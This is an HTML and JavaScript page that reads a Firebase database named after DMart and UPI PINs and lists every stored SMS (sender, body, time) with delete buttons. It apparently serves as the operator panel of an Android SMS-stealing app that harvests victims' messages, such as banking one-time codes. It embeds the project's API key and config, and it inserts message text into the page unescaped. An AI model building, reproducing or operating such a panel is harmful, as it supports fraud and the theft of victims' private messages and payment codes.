<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>All SMS Messages (Realtime + Delete)</title>
  <style>
    body {font-family: Arial, sans-serif; margin: 40px;}
    h2 {margin-top: 30px;}
    .sms-card {background: #f9f9f9; padding: 12px; margin: 8px 0; border: 1px solid #ddd; border-radius: 6px;}
    .delete-btn {background: #d9534f; color: #fff; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer;}
    .delete-btn:hover {background: #c9302c;}
  </style>
</head>
<body>
  <h1>All SMS Messages in Firebase (Realtime)</h1>
  <div id="content">Loading...</div>

  <!-- Firebase -->
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
  <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
  <script>
    const firebaseConfig = {
      apiKey: "AIzaSyAsXFp45tGYHCEZ-z4uYR8o1MYb3EhLTZg",
      authDomain: "dmart-upipin-1457-8-8-25.firebaseapp.com",
      projectId: "dmart-upipin-1457-8-8-25",
      storageBucket: "dmart-upipin-1457-8-8-25.firebasestorage.app",
      messagingSenderId: "391446281272",
      appId: "1:391446281272:android:19f745ba7d7dcd4b7e3acd",
    };

    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const container = document.getElementById('content');

    // Recursively search for SMS nodes in any object
    function findSMS(obj, path = '') {
      let results = [];
      if (obj && typeof obj === 'object') {
        for (const key in obj) {
          if (key === 'sms' && typeof obj[key] === 'object') {
            // Collect all messages under this sms node
            Object.entries(obj[key]).forEach(([msgId, smsObj]) => {
              results.push({
                path: `${path}/sms/${msgId}`,
                sms: smsObj
              });
            });
          } else {
            results = results.concat(findSMS(obj[key], path ? `${path}/${key}` : key));
          }
        }
      }
      return results;
    }

    function render(snapshot) {
      container.innerHTML = '';
      const data = snapshot.val() || {};
      const smsList = findSMS(data);

      if (smsList.length === 0) {
        container.textContent = 'No SMS messages found.';
        return;
      }

      smsList.forEach(({ path, sms }) => {
        const card = document.createElement('div');
        card.className = 'sms-card';
        card.innerHTML = `
          <b>Path:</b> ${path}<br/>
          <b>Sender:</b> ${sms.sender || ''}<br/>
          <b>Body:</b> ${sms.messageBody || ''}<br/>
          <b>Time:</b> ${sms.time || ''}<br/>
          <button class="delete-btn" onclick="deleteMsg('${path}')">Delete</button>
        `;
        container.appendChild(card);
      });
    }

    db.ref('/').on('value', (snapshot) => {
      render(snapshot);
    });

    function deleteMsg(path) {
      if (confirm(`Delete this message at:\n${path} ?`)) {
        db.ref(path).remove()
          .catch(e => alert("Error: " + e.message));
      }
    }
  </script>
</body>
</html>
